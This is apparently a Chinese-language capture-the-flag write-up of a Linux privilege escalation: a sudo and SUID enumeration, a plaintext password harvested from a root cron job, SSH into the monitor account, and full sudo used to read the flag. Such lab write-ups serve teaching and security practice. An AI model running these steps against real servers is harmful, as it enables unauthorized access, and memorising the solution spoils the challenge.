某团队委托你对一台服务器做一次常规安全检查，目前只给你开通了一个普通账号。访问题目端口进入 Web 终端（用户 player），请设法取得最高权限并找到 flag。

执行`sudo -l`查找免密命令、`find / -perm -4000 2>/dev/null`查找SUID命令皆无所获

在`/etc/cron.d`目录下发现了一个名为`backup`的定时任务，内容如下：

```bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root sshpass -p 'Monitor@2026' rsync -az --delete -e "ssh -o StrictHostKeyChecking=no" /data/app/ monitor@127.0.0.1:/backups/app/ >>/var/log/backup.log 2>&1
```

直接告诉了我们本机monitor用户的密码

用`ssh`登录monitor

```bash
ssh monitor@127.0.0.1
# 输入密码 Monitor@2026
```

输入`sudo -l`查看monitor用户的sudo权限

```
Matching Defaults entries for monitor on 6f59de8d701c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User monitor may run the following commands on 6f59de8d701c:
    (ALL) NOPASSWD: ALL
```

已确认权限，直接查看`/flag`

```bash
sudo cat /flag
```
